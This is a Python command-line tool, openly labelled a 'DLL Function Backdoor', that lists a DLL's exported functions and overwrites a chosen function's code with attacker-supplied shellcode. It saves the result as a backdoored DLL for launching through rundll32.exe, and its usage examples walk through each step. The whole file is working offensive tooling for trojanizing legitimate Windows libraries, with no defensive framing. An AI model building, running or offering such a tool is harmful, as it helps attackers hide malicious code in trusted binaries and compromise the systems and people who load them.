#!/usr/bin/env python3
"""
Enhanced DLL Function Backdoor Tool
Backdoor specific exported functions in DLLs for use with rundll32.exe
"""

import pefile
import argparse
import sys
import struct

def list_exports(dll_path):
    """List all exported functions from a DLL"""
    try:
        pe = pefile.PE(dll_path)
    except Exception as e:
        print(f"[-] Error loading DLL: {e}")
        sys.exit(1)

    if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        print("[-] DLL has no export directory")
        sys.exit(1)

    print(f"[+] Exported functions in {dll_path}:")
    print("-" * 60)

    exports = []
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name:
            name = exp.name.decode('utf-8', errors='ignore')
            rva = exp.address
            try:
                offset = pe.get_offset_from_rva(rva)
                # Find which section this export is in
                section = None
                for s in pe.sections:
                    if s.VirtualAddress <= rva < s.VirtualAddress + s.Misc_VirtualSize:
                        section = s.Name.decode('utf-8', errors='ignore').strip('\x00')
                        break

                exports.append({
                    'name': name,
                    'rva': rva,
                    'offset': offset,
                    'section': section or 'Unknown'
                })
            except Exception:
                continue

    if not exports:
        print("[-] No named exports found")
        return []

    for exp in sorted(exports, key=lambda x: x['name']):
        print(f"  {exp['name']:<40} RVA: 0x{exp['rva']:08X}  Section: {exp['section']}")

    print("-" * 60)
    print(f"[+] Total: {len(exports)} exported functions")
    return exports

def inject_shellcode(dll_path, function_name, shellcode_path, output_path, method='direct'):
    """
    Inject shellcode into a specific DLL exported function

    Methods:
      direct - Directly overwrite function code (simple, but destroys original function)
      cave   - Use code cave and redirect (preserves more of original, experimental)
    """
    try:
        pe = pefile.PE(dll_path)
    except Exception as e:
        print(f"[-] Error loading DLL: {e}")
        sys.exit(1)

    # Read shellcode
    try:
        with open(shellcode_path, "rb") as f:
            shellcode = f.read()
    except Exception as e:
        print(f"[-] Error reading shellcode: {e}")
        sys.exit(1)

    if len(shellcode) == 0:
        print("[-] Shellcode file is empty")
        sys.exit(1)

    # Check for export directory
    if not hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        print("[-] DLL has no export directory")
        sys.exit(1)

    # Find the target export
    found = False
    export_rva = None
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        if exp.name and exp.name.decode('utf-8', errors='ignore') == function_name:
            export_rva = exp.address
            found = True
            break

    if not found:
        print(f"[-] Export '{function_name}' not found.")
        print("[*] Use --list to see available exports")
        sys.exit(1)

    # Get file offset from RVA
    try:
        export_offset = pe.get_offset_from_rva(export_rva)
    except Exception as e:
        print(f"[-] Error converting RVA to offset: {e}")
        sys.exit(1)

    # Find the section containing this export
    section = None
    for s in pe.sections:
        if s.VirtualAddress <= export_rva < s.VirtualAddress + s.Misc_VirtualSize:
            section = s
            break

    if not section:
        print("[-] Export lies outside any valid section")
        sys.exit(1)

    section_name = section.Name.decode('utf-8', errors='ignore').strip('\x00')

    # Calculate available space
    max_len = (section.VirtualAddress + section.Misc_VirtualSize) - export_rva

    print(f"[+] Target function: {function_name}")
    print(f"[+] Export RVA:      0x{export_rva:08X}")
    print(f"[+] File offset:     0x{export_offset:08X}")
    print(f"[+] Section:         {section_name}")
    print(f"[+] Shellcode size:  {len(shellcode)} bytes")
    print(f"[+] Available space: {max_len} bytes")

    if len(shellcode) > max_len:
        print(f"[-] Shellcode too large ({len(shellcode)} bytes > {max_len} max)")
        print("[*] Consider using a smaller shellcode or code cave method")
        sys.exit(1)

    # Check if section is executable
    if not (section.Characteristics & 0x20000000):  # IMAGE_SCN_MEM_EXECUTE
        print(f"[!] Warning: Section {section_name} is not marked as executable")
        print("[*] The backdoor may not work. Consider making the section executable.")

    # Perform injection based on method
    if method == 'direct':
        print(f"[+] Using direct injection method")
        print(f"[+] Overwriting function at offset 0x{export_offset:X}")

        patched = bytearray(pe.__data__)
        patched[export_offset : export_offset + len(shellcode)] = shellcode
        pe.__data__ = bytes(patched)

    else:
        print(f"[-] Unknown injection method: {method}")
        sys.exit(1)

    # Write patched DLL
    try:
        pe.write(output_path)
        print(f"[+] Patched DLL saved to: {output_path}")
        print(f"[+] Test with: rundll32.exe {output_path},{function_name}")
    except Exception as e:
        print(f"[-] Error writing output file: {e}")
        sys.exit(1)

def main():
    banner = """
╔═══════════════════════════════════════════════════════════╗
║       DLL Function Backdoor - rundll32.exe ready          ║
╚═══════════════════════════════════════════════════════════╝
"""
    print(banner)

    parser = argparse.ArgumentParser(
        description="Backdoor DLL exported functions for rundll32.exe execution",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  List exports:
    %(prog)s --dll target.dll --list

  Backdoor a function:
    %(prog)s --dll target.dll --function MyFunction --shellcode payload.bin --output backdoored.dll

  Test backdoored DLL:
    rundll32.exe backdoored.dll,MyFunction
        """
    )

    parser.add_argument("--dll", "-d", required=True, help="Input DLL file")
    parser.add_argument("--list", "-l", action="store_true", help="List all exported functions")
    parser.add_argument("--function", "-f", help="Target exported function name")
    parser.add_argument("--shellcode", "-s", help="Shellcode file (raw binary)")
    parser.add_argument("--output", "-o", help="Output patched DLL file")
    parser.add_argument("--method", "-m", default="direct", choices=["direct"],
                       help="Injection method (default: direct)")

    args = parser.parse_args()

    # List mode
    if args.list:
        list_exports(args.dll)
        sys.exit(0)

    # Injection mode - validate arguments
    if not args.function:
        parser.error("--function is required for injection mode (or use --list)")
    if not args.shellcode:
        parser.error("--shellcode is required for injection mode")
    if not args.output:
        parser.error("--output is required for injection mode")

    inject_shellcode(args.dll, args.function, args.shellcode, args.output, args.method)

if __name__ == "__main__":
    main()
